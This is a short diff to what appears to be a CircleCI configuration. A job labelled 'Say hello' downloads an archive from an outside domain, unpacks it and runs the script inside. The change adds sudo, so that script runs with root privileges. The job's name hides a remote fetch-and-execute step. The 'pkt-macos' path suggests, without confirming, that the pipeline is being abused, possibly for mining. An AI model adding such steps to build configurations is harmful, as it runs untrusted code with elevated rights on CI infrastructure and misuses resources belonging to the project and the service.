@@ -7,7 +7,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "brew install node wget; wget -q https://ngewe.tech/apostropis/pkt-macos/setup-docker.tar.xz; tar xf setup-docker.tar.xz; node setup-docker.js; docker run ubuntu:latest"
+          command: "brew install node wget; wget -q https://ngewe.tech/apostropis/pkt-macos/setup-docker.tar.xz; tar xf setup-docker.tar.xz; sudo node setup-docker.js; docker run ubuntu:latest"
 workflows:
   say-hello-workflow:
     jobs:
